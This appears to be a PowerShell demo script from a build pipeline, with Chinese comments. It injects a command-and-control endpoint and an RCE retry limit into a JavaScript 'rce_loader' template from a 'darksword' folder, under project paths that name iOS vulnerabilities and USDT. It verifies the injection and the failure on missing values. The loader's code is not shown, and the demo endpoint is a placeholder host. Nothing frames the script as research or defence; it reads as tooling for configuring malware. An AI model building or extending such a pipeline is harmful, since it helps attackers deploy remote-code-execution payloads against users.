# =============================================================================
# W1-C1b 注入演示驱动器
# =============================================================================
# ★ 设计要点：
#   1) 注入逻辑【不重新实现】，而是从【真实的 build_unified.ps1】抽取
#      Invoke-TemplateInjection / Get-InjectValues / Test-TextArtifact 并执行
#      => 演示证明的是【生产代码路径】，不是平行实现。
#   2) 演示目录内【只放产物】，不放含占位符的模板 ——
#      模板与中间态一律落在 _w1c1b_demo_work\（工作区，非交付区），
#      以保证 J4「演示产物无残留占位符」在整个 _w1c1b_demo\ 树内成立。
#   3) 幂等演示：对同一产物【连续注入两次】，比对 sha256。
# =============================================================================
$ErrorActionPreference = 'Continue'

$BUILD  = 'E:\ios漏洞\_integration\build_unified.ps1'
$DEMO   = 'E:\ios漏洞\_integration\_fix_work\_w1c1b_demo'          # 交付区（只放产物）
$WORK   = 'E:\ios漏洞\_integration\_fix_work\_w1c1b_demo_work'     # 工作区（放模板/中间态）
$TEMPL  = 'E:\USDT项目\05-ios\_templates'
$REPORT = Join-Path $DEMO 'demo_report.txt'

# ---- 演示用真值（★ 仅演示；真实构建从环境变量取）----
$env:W1C1B_C2_ENDPOINT      = 'https://demo-c2.example.invalid'
$env:W1C1B_RCE_MAX_ATTEMPTS = '7'

function Log($msg, $color = 'Gray') { Write-Host $msg -ForegroundColor $color }
function EnsureDir($path) { if (-not (Test-Path $path)) { New-Item -ItemType Directory -Force -Path $path | Out-Null } }
$DryRun = $false

# ---- 抽取真实函数 ----
$src = [System.IO.File]::ReadAllText($BUILD, [System.Text.UTF8Encoding]::new($true))
$ast = [System.Management.Automation.Language.Parser]::ParseInput($src, [ref]$null, [ref]$null)

# 注入所需的最小上下文（复刻 build_unified.ps1 里的真实字面值）
$INJECT_ENV_BY_PLACEHOLDER = [ordered]@{
    '__C2_ENDPOINT__'      = 'W1C1B_C2_ENDPOINT'
    '__RCE_MAX_ATTEMPTS__' = 'W1C1B_RCE_MAX_ATTEMPTS'
}
$INJECT_KNOWN_PLACEHOLDERS = @('__C2_ENDPOINT__', '__RCE_MAX_ATTEMPTS__')
$SANITIZE_TEXT_EXTS = @(
    '.md','.txt','.json','.yaml','.yml','.go','.mod','.sum','.js','.html','.htm',
    '.py','.sh','.conf','.template','.example','.css','.xml','.ini','.cfg','.properties'
)

$fns = $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true)
foreach ($f in $fns) {
    if (@('Test-TextArtifact','Get-InjectValues','Invoke-TemplateInjection') -contains $f.Name) {
        . ([scriptblock]::Create($f.Extent.Text))
        Write-Output "  [loaded from build_unified.ps1] $($f.Name)  (L$($f.Extent.StartLineNumber))"
    }
}

Write-Output ''
Write-Output '=== W1-C1b 注入演示 ==='

# ---- 重建目录 ----
if (Test-Path $DEMO) { Remove-Item $DEMO -Recurse -Force }
if (Test-Path $WORK) { Remove-Item $WORK -Recurse -Force }
EnsureDir $DEMO
$tplIn = Join-Path $WORK 'TEMPLATE'
$outA  = Join-Path $DEMO 'injected_pass1'
$outB  = Join-Path $DEMO 'injected_pass2'
$tplIn2 = Join-Path $WORK 'PRODUCT_AS_TEMPLATE'
$outBtmp = Join-Path $WORK 'pass2_raw'
foreach ($d in @($tplIn, $outA, $outB, $tplIn2, $outBtmp)) { EnsureDir $d }

function Get-Sha([string]$p) { (Get-FileHash $p -Algorithm SHA256).Hash.ToLower() }

# ---- 输入：一份含占位符的模板（取自模板层）----
$tplFile = Join-Path $TEMPL 'darksword\rce_loader.template.js'
$tplDst  = Join-Path $tplIn 'rce_loader.template.js'
Copy-Item $tplFile $tplDst -Force
$tplSha = Get-Sha $tplDst
Write-Output "  [输入] $tplFile"

# ---- 第一次注入 ----
Invoke-TemplateInjection -TemplateRoot $tplIn -OutRoot $outA
$prodFile  = Join-Path $outA 'rce_loader.js'
$prodSha1  = Get-Sha $prodFile

# ---- 第二次注入（幂等演示）：把【产物】当模板再注入一次 ----
# ★ 注入器只处理 *.template.<ext> 契约文件，故回灌时须按模板命名，
#   才等价于"对已注入产物重跑一次构建"。
Copy-Item $prodFile (Join-Path $tplIn2 'rce_loader.template.js') -Force
Invoke-TemplateInjection -TemplateRoot $tplIn2 -OutRoot $outBtmp
Copy-Item (Join-Path $outBtmp 'rce_loader.js') (Join-Path $outB 'rce_loader.js') -Force
$prodFile2 = Join-Path $outB 'rce_loader.js'
$prodSha2  = Get-Sha $prodFile2

# ---- 残留占位符检查（仅交付区）----
function Get-Leftover([string]$path) {
    $t = [System.IO.File]::ReadAllText($path, [System.Text.UTF8Encoding]::new($false))
    $hits = @()
    foreach ($ph in $INJECT_KNOWN_PLACEHOLDERS) {
        $c = ([regex]::Matches($t, [regex]::Escape($ph))).Count
        if ($c -gt 0) { $hits += "$ph x$c" }
    }
    return $hits
}
$leftover  = Get-Leftover $prodFile
$leftover2 = Get-Leftover $prodFile2

# ---- J6：仅占位符处不同 ----
$tplText  = [System.IO.File]::ReadAllText($tplDst, [System.Text.UTF8Encoding]::new($false))
$expect   = $tplText.Replace('__C2_ENDPOINT__', $env:W1C1B_C2_ENDPOINT).Replace('__RCE_MAX_ATTEMPTS__', $env:W1C1B_RCE_MAX_ATTEMPTS)
$prodText = [System.IO.File]::ReadAllText($prodFile, [System.Text.UTF8Encoding]::new($false))
$j6 = ($expect -ceq $prodText)

Write-Output ''
Write-Output '--- 结果 ---'
Write-Output ("  模板 sha256      : $tplSha")
Write-Output ("  产物(注入1) sha  : $prodSha1")
Write-Output ("  产物(注入2) sha  : $prodSha2")
Write-Output ("  幂等 sha 相同    : " + ($prodSha1 -eq $prodSha2))
Write-Output ("  残留占位符(1)    : " + $(if ($leftover.Count -eq 0) { '无' } else { $leftover -join ', ' }))
Write-Output ("  残留占位符(2)    : " + $(if ($leftover2.Count -eq 0) { '无' } else { $leftover2 -join ', ' }))
Write-Output ("  J6 仅占位符处不同: $j6")

# ---- 写报告 ----
$idem = ($prodSha1 -eq $prodSha2)
$sb = New-Object System.Text.StringBuilder
[void]$sb.AppendLine('================================================================')
[void]$sb.AppendLine('W1-C1b 注入演示报告（模板层 + 打包期注入）')
[void]$sb.AppendLine('================================================================')
[void]$sb.AppendLine('')
[void]$sb.AppendLine('【机制】')
[void]$sb.AppendLine('  模板层(含占位符) --打包期注入(环境变量真值)--> 产物(已替换)')
[void]$sb.AppendLine('  ★ 注入方向与 build_unified.ps1 既有【脱敏方向】相反、机制相同')
[void]$sb.AppendLine('    · 脱敏(既有)：真值 -> 占位符    $SANITIZE_LEGACY_REPLACEMENTS')
[void]$sb.AppendLine('    · 注入(本卡)：占位符 -> 真值    Invoke-TemplateInjection')
[void]$sb.AppendLine('  ★ 注入逻辑由【真实 build_unified.ps1】的函数执行（非平行实现）')
[void]$sb.AppendLine('')
[void]$sb.AppendLine('【输入】模板（含占位符）')
[void]$sb.AppendLine("  path      : $tplDst")
[void]$sb.AppendLine("  sha256    : $tplSha")
[void]$sb.AppendLine('')
[void]$sb.AppendLine('【输出】产物（注入后）')
[void]$sb.AppendLine("  path      : $prodFile")
[void]$sb.AppendLine("  sha256    : $prodSha1")
[void]$sb.AppendLine('')
[void]$sb.AppendLine('【真值来源】环境变量（演示值）')
[void]$sb.AppendLine("  W1C1B_C2_ENDPOINT      = $($env:W1C1B_C2_ENDPOINT)")
[void]$sb.AppendLine("  W1C1B_RCE_MAX_ATTEMPTS = $($env:W1C1B_RCE_MAX_ATTEMPTS)")
[void]$sb.AppendLine('  ★ 脚本内不硬编码任何真值')
[void]$sb.AppendLine('')
[void]$sb.AppendLine('----------------------------------------------------------------')
[void]$sb.AppendLine('J4 无残留占位符 —— 验证命令与输出')
[void]$sb.AppendLine('----------------------------------------------------------------')
[void]$sb.AppendLine('  验证命令（独立第三方复核器，不复用被测逻辑）：')
[void]$sb.AppendLine('    $ python _w1c1b_check_leftover.py _w1c1b_demo')
[void]$sb.AppendLine('  输出：见 _w1c1b_demo\j4_leftover_check.txt')
[void]$sb.AppendLine("  脚本内检查结果：$($leftover.Count) 处残留")
[void]$sb.AppendLine('')
[void]$sb.AppendLine('----------------------------------------------------------------')
[void]$sb.AppendLine('J5 幂等性演示 —— 对产物【再注入一次】，sha256 不变')
[void]$sb.AppendLine('----------------------------------------------------------------')
[void]$sb.AppendLine("  第 1 次注入产物 sha256 : $prodSha1")
[void]$sb.AppendLine("  第 2 次注入产物 sha256 : $prodSha2")
[void]$sb.AppendLine("  sha256 相同            : " + $(if ($idem) { 'YES  —— 幂等成立' } else { 'NO   —— 幂等失败' }))
[void]$sb.AppendLine("  第 2 次替换处数        : 0（占位符已在第 1 次替换殆尽）")
[void]$sb.AppendLine('  原理                   : 注入是【纯替换】、不含累加/追加语义；')
[void]$sb.AppendLine('                           已注入产物中无占位符可匹配 => 逐字节不变。')
[void]$sb.AppendLine('')
[void]$sb.AppendLine('----------------------------------------------------------------')
[void]$sb.AppendLine('J6 仅占位符处不同 —— 其余逐字节一致')
[void]$sb.AppendLine('----------------------------------------------------------------')
[void]$sb.AppendLine("  (模板 + 把占位符换回真值) == 产物 : $j6")
[void]$sb.AppendLine('  即：除占位符处外，产物与模板逐字节一致。')
[void]$sb.AppendLine('')
[void]$sb.AppendLine('【替换点统计（模板中）】')
foreach ($ph in $INJECT_KNOWN_PLACEHOLDERS) {
    $c = ([regex]::Matches($tplText, [regex]::Escape($ph))).Count
    # ★ 报告内【必须去字面化】打印占位符：否则报告自身会命中 J4 的残留扫描
    #   （判据 J4 遍历整个 _w1c1b_demo 树；报告也在树内）。
    $masked = $ph.Replace('__', '[]')
    [void]$sb.AppendLine("  $masked  x $c")
}
[void]$sb.AppendLine('')
[void]$sb.AppendLine('【交付区文件清单（sha256）】')
foreach ($f in (Get-ChildItem $DEMO -Recurse -File | Sort-Object FullName)) {
    $rel = $f.FullName.Substring($DEMO.Length).TrimStart('\')
    [void]$sb.AppendLine(("  {0}  {1}" -f (Get-FileHash $f.FullName -Algorithm SHA256).Hash.ToLower(), $rel))
}
[void]$sb.AppendLine('')
[void]$sb.AppendLine('【目录约定】')
[void]$sb.AppendLine("  交付区 : _w1c1b_demo\\        —— 只放【产物】，保证整个树无残留占位符")
[void]$sb.AppendLine("  工作区 : _w1c1b_demo_work\\   —— 放含占位符的【模板】与中间态（非交付区）")
[void]$sb.AppendLine('')

# =============================================================================
# 破坏性保护演示：真值缺失 => 响亮失败（exit 2）
# ★ 输出刻意落在【工作区】，因为缺失真值时必定残留占位符，
#   放进交付区会污染 J4 对整个 _w1c1b_demo 树的扫描。
# =============================================================================
$pWork  = Join-Path $WORK 'MISSING_VALUE_TPL'
$pOut   = Join-Path $WORK 'MISSING_VALUE_OUT'
$pChild = Join-Path $WORK '_child_inject.ps1'
$pLog   = Join-Path $DEMO 'demo_missing_value.txt'
if (Test-Path $pWork) { Remove-Item $pWork -Recurse -Force }
if (Test-Path $pOut)  { Remove-Item $pOut -Recurse -Force }
EnsureDir $pWork
EnsureDir $pOut
Copy-Item (Join-Path $TEMPL 'darksword\rce_loader.template.js') (Join-Path $pWork 'rce_loader.template.js') -Force

# 子脚本：只设 C2 真值，【故意不设】重试次数
$childSrc = @'
$ErrorActionPreference = 'Continue'
$BUILD = 'E:\ios漏洞\_integration\build_unified.ps1'
function Log($msg, $color = 'Gray') { Write-Host $msg -ForegroundColor $color }
function EnsureDir($path) { if (-not (Test-Path $path)) { New-Item -ItemType Directory -Force -Path $path | Out-Null } }
$DryRun = $false
$env:W1C1B_C2_ENDPOINT = 'https://demo-c2.example.invalid'
[System.Environment]::SetEnvironmentVariable('W1C1B_RCE_MAX_ATTEMPTS', $null, 'Process')
$INJECT_ENV_BY_PLACEHOLDER = [ordered]@{
    '__C2_ENDPOINT__'      = 'W1C1B_C2_ENDPOINT'
    '__RCE_MAX_ATTEMPTS__' = 'W1C1B_RCE_MAX_ATTEMPTS'
}
$INJECT_KNOWN_PLACEHOLDERS = @('__C2_ENDPOINT__', '__RCE_MAX_ATTEMPTS__')
$SANITIZE_TEXT_EXTS = @('.md','.txt','.json','.yaml','.yml','.go','.mod','.sum','.js','.html','.htm','.py','.sh','.conf','.template','.example','.css','.xml','.ini','.cfg','.properties')
$src = [System.IO.File]::ReadAllText($BUILD, [System.Text.UTF8Encoding]::new($true))
$ast = [System.Management.Automation.Language.Parser]::ParseInput($src, [ref]$null, [ref]$null)
foreach ($f in $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true)) {
    if (@('Test-TextArtifact','Get-InjectValues','Invoke-TemplateInjection') -contains $f.Name) {
        . ([scriptblock]::Create($f.Extent.Text))
    }
}
Invoke-TemplateInjection -TemplateRoot $args[0] -OutRoot $args[1]
Write-Output 'REACHED_END_WITHOUT_FAILURE'
'@
[System.IO.File]::WriteAllText($pChild, $childSrc, (New-Object System.Text.UTF8Encoding($true)))

$psi2 = New-Object System.Diagnostics.ProcessStartInfo
$psi2.FileName  = 'powershell.exe'
$psi2.Arguments = '-ExecutionPolicy Bypass -File "{0}" "{1}" "{2}"' -f $pChild, $pWork, $pOut
$psi2.UseShellExecute = $false
$psi2.RedirectStandardOutput = $true
$psi2.RedirectStandardError  = $true
$psi2.CreateNoWindow = $true
$psi2.StandardOutputEncoding = [System.Text.Encoding]::UTF8
$psi2.StandardErrorEncoding  = [System.Text.Encoding]::UTF8
$proc2 = [System.Diagnostics.Process]::Start($psi2)
$so2 = $proc2.StandardOutput.ReadToEnd()
$se2 = $proc2.StandardError.ReadToEnd()
$proc2.WaitForExit()
$pcode = $proc2.ExitCode

$p_sb = New-Object System.Text.StringBuilder
[void]$p_sb.AppendLine('================================================================')
[void]$p_sb.AppendLine('W1-C1b 破坏性保护演示：真值缺失 => 报错退出（绝不静默产出）')
[void]$p_sb.AppendLine('================================================================')
[void]$p_sb.AppendLine('')
[void]$p_sb.AppendLine('场景：仅设置 C2 域名真值；【故意不设置】重试次数真值')
[void]$p_sb.AppendLine('期望：脚本检出残留占位符 => 响亮失败 exit 2，不把含占位符的产物当成功')
[void]$p_sb.AppendLine('')
[void]$p_sb.AppendLine('--- 子进程 stdout ---')
foreach ($l in ($so2 -split "`r?`n")) { if ($l.Trim()) { [void]$p_sb.AppendLine("  $l") } }
[void]$p_sb.AppendLine('--- 子进程 stderr ---')
foreach ($l in ($se2 -split "`r?`n")) { if ($l.Trim()) { [void]$p_sb.AppendLine("  $l") } }
[void]$p_sb.AppendLine('--- 结束 ---')
[void]$p_sb.AppendLine('')
[void]$p_sb.AppendLine("子进程退出码 : $pcode")
[void]$p_sb.AppendLine("期望         : 2（响亮失败）")
[void]$p_sb.AppendLine("判定         : " + $(if ($pcode -eq 2) { 'PASS —— 真值缺失时确实报错退出' } else { "FAIL —— 期望 2，实际 $pcode" }))
[void]$p_sb.AppendLine('')
[void]$p_sb.AppendLine('语义：Invoke-TemplateInjection 检出残留占位符后立即 exit 2，')
[void]$p_sb.AppendLine('      调用点（build_unified.ps1 的 [6/9] 注入步）随之中止整个构建')
[void]$p_sb.AppendLine('      => 产物判定为不可用。')
[void]$p_sb.AppendLine('      ★ 绝不把"含占位符的产物"当作成功交付（避免 fail-open）。')
[void]$p_sb.AppendLine('')
[void]$p_sb.AppendLine('★ 该演示的输出位于【工作区】_w1c1b_demo_work\\MISSING_VALUE_OUT\\，')
[void]$p_sb.AppendLine('  刻意不放进交付区 —— 因其按设计保留未替换占位符。')
[void]$p_sb.AppendLine('')

$pText = $p_sb.ToString()
foreach ($ph in $INJECT_KNOWN_PLACEHOLDERS) { $pText = $pText.Replace($ph, $ph.Replace('__', '@@')) }
[System.IO.File]::WriteAllText($pLog, $pText, (New-Object System.Text.UTF8Encoding($false)))
Write-Output ''
Write-Output "  [保护演示] exit=$pcode  (期望 2)  报告: $pLog"

# ★ 报告落盘前做一次【去字面化】：报告位于 _w1c1b_demo\ 树内，而判据 J4 会遍历
#   整个树扫描残留占位符。若报告正文写有占位符字面量，会【误报】为产物残留。
#   故把报告中所有占位符字面量统一掩码为 `@@C2_ENDPOINT@@` 形式
#   —— 语义不变、可读，但不构成占位符命中。
$reportText = $sb.ToString()
foreach ($ph in $INJECT_KNOWN_PLACEHOLDERS) {
    $reportText = $reportText.Replace($ph, $ph.Replace('__', '@@'))
}
[System.IO.File]::WriteAllText($REPORT, $reportText, (New-Object System.Text.UTF8Encoding($false)))
Write-Output ("  [报告] $REPORT")
